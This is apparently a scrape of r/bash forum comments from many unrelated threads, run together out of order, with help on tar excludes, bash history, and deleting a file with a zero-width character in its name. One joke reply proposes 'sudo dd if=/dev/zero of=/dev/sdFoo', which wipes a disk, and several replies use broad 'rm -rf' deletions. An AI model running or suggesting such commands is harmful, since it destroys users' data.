It isnt clear what happens when a VPS is already in use. How is the client rejected: Is it "connection refused, dropped connection, or login prompt?" sshd_config has a ForceCommand phrase that would force a user to execute a specific command. But you need a command to choose which VPS. I would install socat and when logging in, run them into a script. The script will be able to tell which connections are already running and choose one that isnt running. The VPS are on different local ssh ports? Or different virtual IPs? Your script would do a netstat and find out which one is available and then exec socat the glue the existing connection to the VPS IP:port. There is no real sense firing ssh again. 
Ah thank you!
There are a variety of issues you may be describing - not sure if any of these cover it. Check the current env variables and ensure they match what you are trying to set echo "HISTFILESIZE: $HISTFILESIZE, HISTSIZE: $HISTSIZE" Depending on how you changed the hist size, it may not be visible to all users on the machine. You can set it for all users in /etc/, and you can overwrite system defaults per-user in ~/.bashrc or ~/.bash_profile or similar. If you are doing the latter, make sure your intended local bash config files are being sourced. Using "su" vs "su -" for instance. By default, your terminal will probably keep history in memory and only write to disk when the terminal exits. If you have a lot of terminals open, check the history on each. Perhaps one has the commands saved you want, and exiting that terminal will write them to hist file. First do a history &gt;&gt; my-temp-history to be sure they get saved. Bash "eternal history" + more frequent saves to history file: https://gist.github.com/rebeccacremona/88fc768fb487e80335febbfa31d6251a 
A purpose-specific tool like `prips` or `ipcalc` is probably the best thing to convert those ranges into something usable for your config file: % prips -c 91.236.74.0 91.236.75.255 91.236.74.0/23 But I don't imagine those are included in BSD base utils. tbh it seems like the very vast majority of the entries in that list are single IPs, so if you've got too many limitations to work with i would just ignore them. Use `grep -oE` with your IP-address pattern and pull as many of them out as you can, and don't worry about the rest. But if you really wanted to I suppose you could break the lines with ranges in them up using `read` or something. # Read the line in somehow printf '%s\n' 'Malicious - listed by dshield:95.215.62.0-95.215.62.255' | IFS=: read -r cite range # Print the acknowledgement as a comment for your file printf '# %s\n' "${cite}" # Break the range up into two parts printf '%s\n' "${range}" | IFS=- read -r ip1 ip2 # Now enumerate the ranges somehow I think `jot` comes with most BSDs, so you could do something like this maybe: jot -w "${ip1%.*}." - "${ip1##*.}" "${ip2##*.}" That's assuming obviously that `ip1` and `ip2` have the same first three octets. That seems to be the case usually in that file, but not always. You could break the IPs up further if you wanted to be more accurate with them.
Thank you, the eternal history is really exactly what I was looking for. Should have copied my current history before putting this in my profile, so if anyone else is reading this, don't forget to do that. I also love that it added time stamps!
*--exclude* is a very tricky nut. You might do better using grep and other tools to make a list of the files (or directories) that you DO want to include, and then using that as an input to tar to tell it what to include.
Hackish, but this should get you a list of dirs to exclude, if I understand your question correctly find . -type d -maxdepth 2 -name bad -path "*[a-z]/bad" -exec echo -n "--exclude={} " \; ; echo "" 
You could use find to get your list of exclude directories. Suppose all these files are in 'datadir' find datadir -type d -maxdepth 2 -name bad -path "datadir/*/bad" -exec echo -n "--exclude={} " \; this would print something like --exclude=datadir/bar/bad --exclude=datadir/blat/bad --exclude=datadir/foo/bad but would not include datadir/bad You could include this in a tar command tar -cz $(find datadir -type d -maxdepth 2 -name bad -path "datadir/*/bad" -exec echo -n "--exclude={} " \;) -f archive.tar.gz datadir It is not pretty though. 
You can use find to get your list of exclude directories. Suppose your files are in 'datadir' find datadir -type d -maxdepth 2 -name bad -path "datadir/*/bad" -exec echo -n "--exclude={} " \; this would print something like --exclude=datadir/bar/bad --exclude=datadir/blat/bad --exclude=datadir/foo/bad but would not include datadir/bad You can embed this in a tar command tar $(find datadir -type d -maxdepth 2 -name bad -path "datadir/*/bad" -exec echo -n "--exclude={} " \;) -czf archive.tar.gz datadir 
Wrote a parody called "I Love Linux" using eSpeak because I can't sing and it's awesomely nerdy as hell. It's mostly about Linux, BASH, and command-line.
[from man](https://linux.die.net/man/1/tar) &gt; --exclude-tag-all=FILE exclude directories containing FILE you should touch file *.excl* in data/bad/ for example # touch data/bad/.excl files/bad/.excl # tar --exclude-tag-all='.excl' [your params]
Here's some inspiration for your next track: https://www.youtube.com/watch?v=5bueZoYhUlg https://www.youtube.com/watch?v=0rG74rG_ubs
I like this one a lot too https://youtu.be/B-m6JDYRFvk 
whats the original?
&gt;i have tried --exclude '/*/bad' and '*/bad' and others but they wont work as intended. This is just a shot in teh dark. but have you tried --exclude "./*/bad/*" ? 
Just checked, "./\*/bad/" seemed to work in same way as "\*/bad/". I ended up using snippet like this: find -maxdepth 2 | grep 'bad$' | xargs printf '--exclude %s ' Then use the output as arguments for tar in the script.
 $ mkdir -p {.,data,files,data/scripts,ok/data}/bad $ tar --anchored --no-wildcards-match-slash --exclude \*/bad -c * | tar t bad/ data/ data/scripts/ data/scripts/bad/ files/ ok/ ok/data/ ok/data/bad/ 
PM'd
The last status is not working because now your previous command is the checking of the VPN status which doesn't error out. Also in your VPN status command you are not escaping the square brackets for the non printing characters. Look into using a prompt command instead of putting this logic directly into you PS1.
Look at this [bash_prompt example](https://gist.github.com/31967), this will update your PS1 accordingly. In your .bashrc, you have to source it at last.
This updates your PS1 variable after each command. 
Yay! Will work on this! Thanks 
“source” fails if the file doesn’t exist; the explicit check isn’t necessary. OP needs a double pipe rather than a single pipe.
[removed]
 . file || exit 78
if [ something ]; then action elif do another action elif lets do this last fi
Sourcing the file can still fail if the file exists. Checking the exit code of source is more clean than pre-handling one of the possible error conditions - it's unnecessary code, and doesn't even halt the problem when any other error occurs. Let's say that functions.shd contains a call to an undefined function, for example: $ cat functions.shd undefined_function_call Your code will continue on past the "source": $ cat script1.sh #!/bin/bash [[ -f functions.shd ]] || { echo sourcing error; exit 1; } source ./functions.shd echo "we're still going..." $ ./script1.sh ./functions.shd: line 1: undefined_function_call: command not found we're still going... We could shorten the script and handle failures generally with more elegance like: $ cat functions.shd undefined_function_call $ cat script2.sh #!/bin/bash source ./functions.shd || { echo sourcing error; exit 1; } echo "we're still going..." $ ./script2.sh ./functions.shd: line 1: undefined_function_call: command not found sourcing error 
What's 78? $ grep -e '\s78\s' /usr/include/asm-generic/errno.h #define EREMCHG 78 /* Remote address changed */ 
Although your original post requires a double || to make the conditional work, I think you would still want to have the script exit at `source` before continuing, whether the file is present or loads incorrectly. If the file is not present, the script will exit. If source encounters an error, it will exit the script: `#!/bin/bash set -o errexit source ./functions.shd echo "hello world" `
&gt; It doesn't matter I disagree. Arbitrary numbers in code are confusing. I'd argue that unless you have good reason to differentiate error codes, "1" should be used in scripts per recommendation by the link that you shared. If I run a command that exits in error and check $? to see what might be going on, an arbitrary number like 78 is going to make me raise my eyebrow and probably end up wasting time trying to figure out what its significance was. If the author of the code was so kind as to say "# return arbitrary value 64-113" and then "return 78", i'd be peeved. tl;dr: plz stop
Right, I don’t like magic numbers either, that is why I always use something like this in my scripts exit ${ERROR_FILE_NOT_FOUND}
 $ VAR_1=foo $ VAR_2=bar $ VAR_3=baz $ $ set | grep ^VAR_ VAR_1=foo VAR_2=bar VAR_3=baz $ 
you are all awesome! thank you for all your answers &lt;3 missed the 2nd `|`. too less sleep, too much work.
sed can do it with the `N` command and a loop but it may be simpler with just double `tac`: tac file.txt | sed '/target text/{ h;d } /YYYY-MM-DD/{ G; s/\(.*\)\n\(.*\)/\2\n\1/ }' | tac &gt; new_file.txt Use `\1\t\2` instead of `\2\n\1` for the other result.
This is was eventually worked for me: ^seq="0 3 1 2 4" numlines=$(wc -l &lt; file.txt) for ((i = 0; i &lt;= $numlines; i += 5)) do for j in $seq do line=$(($j + $i)) echo $line awk -v l="$line" 'NR==l+1' file.txt &gt;&gt; newfile.txt done done
I don't think that tac would work as the file has ~5000 lines in these 5 line groupings.
Oops, forgot to remove the echo $line...no wonder I'm getting extraneous output.
 curl -l ( #that's dash uppercase i )
/r/learnpython /r/Python 
what is it a parody of?
[from command line tool interface manual](https://curl.haxx.se/docs/manpage.html#-m) &gt; -m, --max-time &lt;seconds&gt; &gt; Maximum time in seconds that you allow the whole operation to take. This is useful for preventing your batch jobs from hanging for hours due to slow networks or links going down. &gt; Since 7.32.0, this option accepts decimal values, but the actual timeout will decrease in accuracy as the specified timeout increases in decimal precision. See also the --connect-time‐out option. 
&gt; byte() { printf "\\x$(printf "%x" $1)" } It's converting a (ASCII) byte value to its character. The inner printf converts the number to hexadecimal, E.g. $ printf '%x\n' 65 41 And then the outer printf ends up as $ printf '\x41' A In java, the equivalent of this is to simply cast the integer to char System.out.print((char)65); // Outputs: A Never heard of beanshell before, but maybe that'll help you along.
I think that will TOTALLY help me along, thanks! beanshell seems like a VB-script sort of equivalent, and it's used for plugins under the system I am trying to write for, PAWS for Android. It's a webserver. 
 #! /usr/bin/perl use warnings; use strict; use v5.10; #chomp(my $pat=&lt;STDIN&gt;); while(&lt;&gt;) { chomp($_); print &amp;count($_); } { state @arr; state $count=0; sub count { (my $value)=@_; $count++; if($count&lt;5) { if($count==4) { splice @arr,1,0,$value; return; } else { push @arr,$value; return; } } else { #return @arr; push @arr,$value; $count=0; foreach(@arr) { print; } @arr=(); } } } Not an awk or bash expert,this is some terrible perl code;static variable and array;declared them outside sub count resets them after processing 5 lines;then restarts the count process.#--comments, perl -l perlMature.pl min.txt|perl -ne 'print if length($_)&gt;1' No output if counter encounters less than 5 lines. 
What's wrong with `find ... -delete`?
Does ls *minaldi.pdf List that file, and **only** that file? If so, just use rm *minaldi.pdf Alternatively, temporarily move all **other** files and subdirectories to some other directory, then do a recursive rm on the parent
Same - find . -type f -inum 37700 -delete find: cannot delete `./‌minaldi.pdf': No such file or directory
First thing I tried :( - &gt; ls *minaldi.pdf ‌minaldi.pdf &gt; rm *minaldi.pdf rm: cannot remove `‌minaldi.pdf': No such file or directory
 That's.... surprising.. Especially that *rm -fr * failed... There might be a filesystem corruption issue - you might need to run an *fsck* on the filesystem (if its on your root FS or something else you can't unmount, then that would have to happen with a reboot)
Try to rename and then delete
simple mv won't work as I can't specify exact file name on prompt. Using find command to move also failing. &gt; find . -type f -inum 37700 -exec mv '{}' tmp.pdf \; mv: cannot move `./‌minaldi.pdf' to `tmp.pdf': No such file or directory
try it with single ticks: rm -rf '&lt;200c&gt;minaldi.pdf' or escape the offending characters: rm -rf \&lt;200c\&gt;minaldi.pdf
ascii &lt;200c&gt; is not actually part of file name rather it's a representation in vi for the actual non-printable character so your solution is not applicable.
What about? &gt; stat *minaldi.pdf
 &gt; stat *minaldi.pdf File: `‌minaldi.pdf' Size: 41890 Blocks: 96 IO Block: 32768 regular file Device: 16h/22d Inode: 37700 Links: 1 Access: (0755/-rwxr-xr-x) Uid: ( 600/ user) Gid: ( 600/ group) Access: 2017-12-17 11:46:20.986368000 -0600 Modify: 2016-10-19 09:37:35.000000000 -0500 Change: 2017-12-17 11:48:11.578920000 -0600 
What about for f in *minaldi.pdf; do printf '%q\n' "$f"; done This should print the name quoted such that it could be reused by shell commands. Yet since you can't even delete it via inode makes me think it's a file system problem.
&gt; rm -f -- *minaldi.pdf Yeah looks like FS problem, any of the commands didn't work.
&gt; rm: cannot remove `mydir': Directory not empty I think you need to switch r and f in your rm according to this [stackoverflow](https://unix.stackexchange.com/questions/48227/cannot-remove-some-directory-directory-not-empty)
I assume you have tried rm "*minaldi*" 
Try creating sub directory DelMe.... then mv * DelMe/
From an earlier response it sounds like moving the file won't work, but maybe a reverse approach: mv * KeepMe cd .. rm -fr oldDir mv KeepMe oldDir 
[removed]
Seems to work fine for me $ cd /tmp $ touch (hold down shift+ctrl and start firing in cheat codes)-someword $ ls -li | cat -v | grep -E 'pants|dog' 398466 -rw-r-----. 1 whetu whetu 0 Dec 17 13:30 M-BM-^C-pants 398489 -rw-r-----. 1 whetu whetu 0 Dec 17 13:32 M-BM-^UM-BM-^CqtM-BM-^C-dog $ $ find . -inum 398489 -exec rm {} \; find: `./orbit-gdm': Permission denied $ ls -li | cat -v | grep -E 'pants|dog' 398466 -rw-r-----. 1 whetu whetu 0 Dec 17 13:30 M-BM-^C-pants `find -delete` also works. As does `rm`: $ touch (ctrl+shift+0200c)-pants $ ls -li *pants 398466 -rw-r-----. 1 whetu whetu 0 Dec 17 13:38 ?-pants $ $ rm (ctrl+shift+0200c)-pants $ $ls -li *pants ls: cannot access *pants: No such file or directory If a `fsck` doesn't help you out, you might like to try `rsync` or `perl -e 'unlink("filename")';` 
Did anyone solve this? In bash, special characters can be printed/handled unescaped using a character expansion notation I forget the name of, but it's like `rm $'\u200cfilename'`.
That isn't really a bash script. I mean it's technically a shell script, but all it does is call awk. To use the Python package: num2words() { # If you're using Python 2, change `python3` to `python` and add # `from __future__ import print_function` python3 - "${1}" &lt;&lt;- 'EOF' from sys import argv from num2words import num2words n = argv[1] print(num2words(float(n) if '.' in n else int(n))) EOF } # Prints 'one hundred and twenty-three' num2words 123 # Prints 'one point two three' num2words 1.23 # Prints 'Lex Luthor took forty cakes' echo "Lex Luthor took $( num2words 40 ) cakes" To use the awk script, it's basically the same thing kind of thing -- copy that big script into a file or into a shell function and then call it like you see there. btw, there are similar packages for Perl, PHP, and other scripting languages, if one of those would be preferable. awk is the most portable, though. Keep in mind that making repeated calls to external interpreters like this (even awk, though it's probably faster than the alternatives) can be very slow -- if you're going to be converting *a lot* of numbers, you might want to write the whole script in some other language.
Works perfectly! Thank you so much.
 #! /bin/bash supplied_variable=$@ if_the_number_has_three_digits(){ the_first_digit=$(($supplied_variable/100)) the_remaining_digits=$(($supplied_variable%100)) my_var1="hundred" third_digit_list_first_number=(null $my_var1 two$my_var1 three$my_var1 four$my_var1 five$my_var1 six$my_var1 seven$my_var1 eight$my_var1 nine$my_var1) return_variable_three_digit_first=${third_digit_list_first_number[$the_first_digit]} echo -n $return_variable_three_digit_first main_procedure $the_remaining_digits } if_the_number_has_two_digits_and_more_than_20(){ safe_var=$@ # echo this seems to be working the_first_digit=$(($safe_var/10)) the_second_digit=$(($safe_var%10)) second_digit_list_first_number=(null null twenty thirty forty fifty sixty seventy eighty ninety) return_variable_one=${second_digit_list_first_number[$the_first_digit]} echo -n $return_variable_one # echo ${second_digit_list_first_number[2]} second_digit_list_second_number=(null one two three four five six seven eight nine) return_variable_two=${second_digit_list_second_number[$the_second_digit]} echo -n $return_variable_two } if_the_number_has_two_digits_and_less_than_20(){ another_safe_var=$@ the_first_digit=$(($another_safe_var/10)) the_second_digit=$(($another_safe_var%10)) two_digit_less_than_twenty=(ten eleven twelve thirteen fourteen fifteen sixteen seventeen eighteen nineteen twenty) #when less than twenty, the first digit does not counts #the second digit counts, like 15 is fifteen return_variable=${two_digit_less_than_twenty[$the_second_digit]} echo -n $return_variable } if_the_number_is_less_than_nine(){ my_var2=$@ single_digit_list=(zero one two three four five six seven eight nine) return_variable=${single_digit_list[$my_var2]} echo -n $return_variable } main_procedure(){ number_of_digits=$(echo -n $@ | wc -c) if [ $number_of_digits -eq 1 ] then if_the_number_is_less_than_nine $@ elif [ $number_of_digits -eq 2 ] then if [ $@ -lt 20 ] then if_the_number_has_two_digits_and_less_than_20 $@ else if_the_number_has_two_digits_and_more_than_20 $@ fi elif [ $number_of_digits -eq 3 ] then if_the_number_has_three_digits else : #not for four digit numbers, i have stopped thinking sorry fi } main_procedure $* 
That works too! Kind of what I had in mind, but seemed wrong somehow. Yours worked great. Thanks.
You can delete files in Emacs dired buffer.
the order of those options should not matter. 
These all seem like really complicated ways of doing this, and maybe you do have to do something really complicated. HOWEVER, have you tried just going into the directory and trying “rm -rf *”? That should remove all the files regardless of what they are. Maybe you already tried it and I am wrong, but i didn’t see anyone post it here yet so there you go. This should delete everything in the directory assuming you have the correct privileges set, so make sure it is the only thing in there.
See /u/megared17's response from 14 hours ago: &gt; Alternatively, temporarily move all other files and subdirectories to some other directory, then do a recursive rm on the parent 
Has he tried “rm -rf *.pdf”? Are we sure he is using bash? I know it may sound like a stupid question but if his glob patterns aren’t expanding properly it is possible he is using a different shell. Could you type “$SHELL” and tell us what the output is?
Looks like the “&lt;200c&gt;” part is a [character code](http://www.fileformat.info/info/unicode/char/200c/index.htm) - specifically a ‘zero width non-joiner’. Have you tried the various deletion incarnations specifying this code explicitly instead of trying to wildcard it?
Didn’t see your comment before adding my own “looks like a character code” comment too. Wondering if your suggestion solved it ¯\_(ツ)_/¯ C’mon OP - updates?
Yea it was a shot in the dark. I didn't think they mattered either and I've never seen that error message with rm -rf myself.
I did use tac elsewhere in the processing of the text, but it wasn't here. I always forget about tac, so that's thanks to you!
 mv: cannot move `‌minaldi.pdf' to `del/‌minaldi.pdf': No such file or director 
&gt; rm "$(printf '\u200c')filename" &gt; rm "$(printf '\u200c')minaldi.pdf" rm: cannot remove `‌minaldi.pdf': No such file or directory
Tried these, no luck - perl -Mcharnames=:full -E 'unlink("\N{ZERO WIDTH NON-JOINER}minaldi.pdf")' rm "$(echo -en './‌\xE2\x80\x8Cminaldi.pdf')"
Try: rm $(echo -e '\u200c')minaldi.pdf
 rm: cannot remove `\\u200cminaldi.pdf': No such file or directory 
Weird... It shouldn't be looking for \\u200cminaldi.pdf. On my computer: &gt; touch $(echo -e '\u200c')minaldi.pdf &gt; ls minaldi.pdf &gt; rm minaldi.pdf rm: cannot remove 'minaldi.pdf': No such file or directory &gt; rm $(echo -e '\u200c')minaldi.pdf &gt; ls -a . ..
&gt; echo $(echo -e '\u200c')minaldi.pdf &gt; echo $(echo -e '\u200c')minaldi.pdf \u200cminaldi.pdf
I guess you have a more complex problem it appears. 
What does `echo ${SHELL}` output? If it outputs `/bin/dash` or something other than bash try creating as a script. #!/bin/bash SYMB=$(echo -e '\u200c') echo ${SYMB}minaldi.pdf rm ${SYMB}minaldi.pdf 
 prompt&gt; echo ${SHELL} /bin/ksh prompt&gt; cat tmp.sh #!/bin/bash SYMB=$(echo -e '\u200c') echo "Deleting [${SYMB}minaldi.pdf]" rm ${SYMB}minaldi.pdf prompt&gt; ./tmp.sh Deleting [\u200cminaldi.pdf] rm: cannot remove `\\u200cminaldi.pdf': No such file or directory 
Yep, looks like :(
What did fsck say?
Ok, something weird is going on with echo. I am trying to figure it out. On my computer: &gt; /bin/echo -e ['\u200c'minaldi.pdf] [\u200cminaldi.pdf] &gt; echo -e ['\u200c'minaldi.pdf] [‌minaldi.pdf] I don't know why the outputs are different. I'll let you know if I figure something out.
Ok, can I get you to try printf instead? Maybe we will have better luck with that. I actually have a script I wrote that I would like to see the output of: https://ideone.com/o7GhOP
4 years ago, I wrote a `seq` implementation in bash that uses words instead of digits. Mainly as a joke. https://github.com/geirha/shbot-initramfs/blob/master/skel/bin/seq
Ran the script - prompt&gt; ./ideone.sh [SHELL=/bin/ksh] Version: version sh (AT&amp;T Research) 93u+ 2012-08-01 #################################################### Creating/Deleting with [/bin/ksh] built-in echo creating \u200cshellEcho.txt #################################################### Creating/Deleting with /bin/echo system echo creating \u200csysEcho.txt #################################################### Creating/Deleting with printf built-in prinf creating \u200cshellPrintf.txt #################################################### Creating/Deleting with /usr/bin/printf system prinf creating ‌sysPrintf.txt #################################################### ideone.sh ‌minaldi.pdf ‌sysPrintf.txt tmp.sh \u200cshellEcho.txt \u200cshellPrintf.txt \u200csysEcho.txt prompt&gt; ll total 56K -rwxr-xr-x 1 user group 41K Oct 19 2016 ‌minaldi.pdf -rwxr-xr-x 1 user group 1.3K Dec 18 15:04 ideone.sh -rw-r--r-- 1 user group 0 Dec 18 15:05 \u200cshellEcho.txt -rw-r--r-- 1 user group 0 Dec 18 15:05 \u200csysEcho.txt -rw-r--r-- 1 user group 0 Dec 18 15:05 \u200cshellPrintf.txt -rw-r--r-- 1 user group 0 Dec 18 15:05 ‌sysPrintf.txt
Don't have permission to run fsck. prompt&gt; fsck fsck from util-linux-ng 2.17.2 WARNING: couldn't open /etc/fstab: Permission denied
ok, that means the last one should work! Run that script again to delete the files it created, and then run: rm $($(which printf) "\\u200c")minaldi.pdf
Looks like a deeper problem - prompt&gt; rm $($(which printf) "\\u200c")minaldi.pdf rm: cannot remove `‌minaldi.pdf': No such file or directory prompt&gt; rm "$($(which printf) "\\u200c")minaldi.pdf" rm: cannot remove `‌minaldi.pdf': No such file or directory 
Oh... sorry, I may have had an extra slash in there. The original script had two slashes because that variable eats one on assignment. rm "$($(which printf) "\u200c")minaldi.pdf" If this doens't work, I am out of ideas.
&gt; rm "$($(which printf) "\u200c")minaldi.pdf" No luck :( Anyways thanks for all your suggestions. I'll run it through our SA hopefully he's figure something out.
Just a heads-up – your comment got caught in the spam filter. I’ve approved it now, but perhaps skip the URL shortener next time :)
That actually sounds like an alright /r/DailyProgrammer challenge.
So wait, that didn't give an error, AND it didn't delete the file? Did my script delete `sysPrintf.txt` when you ran it a second time? In theory, if it did, you could replace line 48 in the above script, with `createOrDeletePrintf $(which printf) minaldi.pdf`, and comment out lines 39, 42 and 45 and unless we are trying to delete the wrong unicode character, it should work. I just feel like we got very close.
Sorry, this post got caught in the spam filter and I only got back from a few days’ break just now to approve it – it should be visible now, but perhaps you want to repost it so more people might see it?
Yeah, tried that. Ends up - rm: cannot remove `‌minaldi.pdf': No such file or directory 
I am so confused. You don't have the extra junk characters in front, so that should have been it. I edited [my top-level comment](https://www.reddit.com/r/bash/comments/7ke4fe/need_help_with_removing_a_file/drfjiv1/), and you can see that I get the same output from `ls | od -bc` that you do. The only thing I can think is to double check that the rouge file *is* still there, because I have no idea why that would not work. Please let me know if you ever figure it out.
FWIW I installed `ksh` (which OP indicated is their shell) and tried your script with the shebang updated to `/bin/ksh`, and it works for me exactly as it works for you.
So then it doesn't work with `#!/bin/bash` at the top of the file for you, but it does work with `#!/bin/ksh`? Apparently I don't understand shells. I thought it was supposed to run in whatever shell was specified by the shebang, but I can see from one of [his replies](https://www.reddit.com/r/bash/comments/7ke4fe/need_help_with_removing_a_file/drfui2s/) that is not the case. What is the point in specifying a shell if it doesn't get used? So I guess we should just tell OP to run the script with `#!/bin/ksh` at the top instead?
&gt; So then it doesn't work with #!/bin/bash at the top of the file for you, but it does work with #!/bin/ksh? No no... sorry I wasn't clear: it works for me with either. I was just FYI'ing. His reply that you reference does mention `/bin/ksh` a bit, but that's because the script he's running is referencing `$SHELL` which isn't that dependable: $ echo $SHELL /bin/bash $ ksh $ echo $SHELL /bin/bash Probably because `bash` is the parent in this scenario. So the shebang should still be used, unless the script is run like `ksh somescript`.
Try escaping before it? I'm surprised none of the options worked. There's a way to do it, for certain. Let me know if you still haven't gotten it and I'll create one in my own setup. You could also try removing the inode, but first you'd need to know how to do that and I don't recall off the top of my head. maybe: &gt; rm "$(printf '\\\u200c')minaldi.pdf" or: &gt; rm \\"$(printf '\u200c')minaldi.pdf"
What have you tried so far?
x=$(du * -h | sort -k1 -r -n | head) I've tried applying this line i found on a similar script, not sure if this applies here. And I can't figure out how to print the file directory.
@PageFault, @whetu tried that script (deleteTheFile.sh) with both bash/ksh. Can't get rid of that file :(
Well, shit. I’m outta ideas...short of `sudo dd if=/dev/zero of=/dev/sdFoo` and walk away :-/
# Find the top 10 largest files find . -type f -ls | sort -k7 -nr | head # Print out the directory that it's in find . -type f -ls | sort -k7 -nr | head | awk '{print $NF}' | xargs -n1 dirname
Seems redundant. $ find . . $ mkdir -p foo/bar/baz/snit/ $ find . . ./foo ./foo/bar ./foo/bar/baz ./foo/bar/baz/snit 
It also creates the final file if the path doesn’t end with a `/`.
 mkdir -p foo/bar/baz/snit/ &amp;&amp; touch foo/bar/baz/snit/file.txt 
Yes, congratulations, you’ve mostly duplicated [the script](https://github.com/tanrax/terminal-AdvancedNewFile/blob/c4b914676c728103a4b71f7bc7267d082ee03f4c/bin/advance)… so what?
 You've written an equivalent of "Hello world." and then published that for distribution.
fsck has to be run as root. !!!!!! **BUT** !!!!!! do not run it with the filesystem mounted.
At the risk of repeating myself – so what? OP has written a script that’s useful for him and then published it because it might be useful to others as well (and clearly it is, the repository’s got 8 stars already). Who cares that it’s simple if it does the job? Do you get annoyed at all the “`mkdir`+`cd`” functions sprinkled over the internet too? (I’d also add that “we all start somewhere”, but from his GitHub profile it seems clear that OP isn’t a newbie, though shell might not be his usual language of choice.)
Can you ask the admin to do it?
To do pattern matching you need to use `[[` instead of `[` syntax (which should be OK since you're posting to r/bash, but that does mean it will not be POSIX compliant/compatible). I recommend reading http://mywiki.wooledge.org/BashFAQ/031 If you want to run a command and see if `not` appears in it's output though, you should probably just execute it and use `|` to send the output to `grep`: if sudo service xyz status | grep -q not; then sudo service xyz start # assuming that's what you want here else # if you are here it did not find "not" in the output fi 
Yes, it's NAS mounted FS.
Yes, I raised a ticket. Hopefully they'll agree to do it.
And for a bit of extra explanation. grep can find patterns in text. the `-q` option tells it to be quiet and simply fail if the pattern is not found.
that's super helpful. Thank you /u/beatle42 &amp; /u/wiley_times!! Now to figure out how to test what I've come up with...man its fun knowing nothing lol.
Yeah it needs to be run locally, not over network. Need to use whatever admin interface the NAS has to have it do a filesystem check.
&gt; Another thing, or detail rather, if it helps, this is using the SALT stack. So this is a command checking if a service across many servers is running or not, and if it is great, do nothing. If it isn't, I want to start the process. I'm not familiar with salt, but that probably means you shouldn't be doing any of this in bash; you'll do it in salt's config language. In Ansible (a similar tool), for instance, I'd write that as: - service: foo state: started You'll note how this shares very little resemblance to the underlying bash commands that you'd execute. You should definitely go confirm the requirements of this and make sure you're going down the right path.
Good call. Thank you for the pro tip!
What's wrong with it, it looks alright. Maybe you just don't echo $x ? Try $ echo $x or just dont use the assignment at all if you don't need that (e.g. run the command inside the parentheses) 
https://salt.readthedocs.io/en/stable/ref/states/all/salt.states.service.html
&gt; If the author of the code was so kind as to say "# return arbitrary value 64-113" and then "return 78", i'd be peeved. [Yea, I was pretty annoyed with exit codes from hdparm and growisofs.](https://www.reddit.com/r/linuxquestions/comments/6nuoaq/how_can_i_look_up_exit_status_codes_reliably/) Honestly, so long as it's listed in a man page, or displayed with `-h`, I'd be happy. 
This is buggy. see output of following. for i in {0..234}; do ./the_above_script.sh $i ; echo ; done
This is buggy. see output of following. for i in {0..234}; do ./the_above_script.sh $i ; echo ; done
You've got a couple of problems, so I started to type up a response detailing some suggestions. Then I wound up just writing this - And I've just finished a couple of rounds of testing. It's a shell function ready to be pasted into dotfiles everywhere... The short version is that it adds a '-p' option to `touch` so that you can use that just like `mkdir`'s '-p' i.e. touch -p /path/to/directory/ Will create a directory touch -p /path/to/directory/and/file Will create the directory structure and file. Any args that `touch` already supports should be passed on and treated natively. So you could do something paradoxical like this: touch -p -c /path/to/directory/and/file '-p' will have the effect of creating the directory structure, but '-c' will prevent the creation of the file :) Users of newer bash versions could make this way more elegant. Feedback welcome, but mostly for ways to make this more elegant while remaining loosely portable. # Add -p option to 'touch' to combine 'mkdir -p' and 'touch' # The trick here is that we use 'command' to launch 'touch', # as it overrides the shell's $PATH lookup.. essentially speaking. touch() { # Check if '-p' is present. # For bash3+ you could use 'if [[ "$@" =~ -p ]];' if grep "\\-p" &lt;&lt;&lt; "$@" &gt;/dev/null 2&gt;&amp;1; then # Transfer everything to a local array local argArray=( "$@" ) # We need to remove '-p' no matter where it is in the array # This means searching for it, unsetting it, and reindexing # Newer bash versions could use "${!argArray[@]}" style handling for (( index=0; index&lt;"${#argArray[@]}"; index++ )); do if [[ "${argArray[index]}" = "-p" ]]; then unset -- argArray["${index}"] argArray=( "${argArray[@]}" ) fi done # Next extract a list of directories to process local dirArray=( "$(printf '%s\n' "${argArray[@]}" | grep "/$")" ) for file in $(printf '%s\n' "${argArray[@]}" | grep "/" | grep -v "/$"); do dirArray+=( "$(dirname "${file}")" ) done # As before, we sanitise the array to prevent issues # In this case, 'mkdir -p "" ' for (( index=0; index&lt;"${#dirArray[@]}"; index++ )); do if [[ -z "${dirArray[index]}" ]]; then unset -- dirArray["${index}"] dirArray=( "${dirArray[@]}" ) fi done # Okay, first, let's deal with the directories if (( "${#dirArray[*]}" &gt; 0 )); then mkdir -p "${dirArray[@]}" fi # Now we can just run 'touch' with the sanitised array command touch "${argArray[@]}" # If '-p' isn't present, just use 'touch' as normal else command touch "$@" fi }
Hey, I'm newish to bash and decided to poke around and found your comment. I wanted to ask, is "-ls" an argument/action (is that the correct term) for a newer 'version' of find? I tried to run your first command there, but it only works if I remove -ls.
Sounds perfect for ansible + tower
Someone will come along with an `awk` one-liner sooner or later, in the meantime though, here's another approach: grep -f &lt;(awk '{print $1}' RSPaV.BLAST.txt) scaffolds.fasta The `-f` option for `grep` allows you to provide a file of patterns to match. You can think of `&lt;(some command)` as a way of tricking `grep` into believing that the output of `some command` is actually a file.
as per http://mywiki.wooledge.org/BashGuide/Arrays, array iteration is $ for file in "${myfiles[@]}"; do may be that is the problem? `*` instead of `@`?
You don't want to quote the command, that's why you are getting that error. You also don't need a + to concatenate. Try `$varGitConf $1` inside the for loop instead.
2. Use ssh public key.
Hi, Both work: Bash permits array operations on variables, even if the variables are not explicitly declared as arrays. From [tldp](http://tldp.org/LDP/abs/html/arrays.html): &gt; string=abcABC123ABCabc &gt; echo ${string[@]} # abcABC123ABCabc &gt; echo ${string[*]} # abcABC123ABCabc &gt; echo ${string[0]} # abcABC123ABCabc &gt; echo ${string[1]} # No output! &gt; echo ${#string[@]} # 1 
Thanks, that helps. Now I have issues with concatenation: pi@raspberrypi:~ $ ./testGit.sh Collecting your data for Git setup... Enter your user name: test123 Enter your email address: test@email.com error: key does not contain a section: test123 error: invalid key: test@email.com error: key does not contain a section: auto Off to google git!!
could you add 3-5 lines each from the two input files and show required output? because you seem to be extracting set of lines for each entry.. may be using `&gt;` as record separator will help.. also what is your awk version? is it GNU awk? if you want some examples on two file field based processing, [see these examples I made](https://github.com/learnbyexample/Command-line-text-processing/blob/master/gnu_awk.md#comparing-specific-fields)
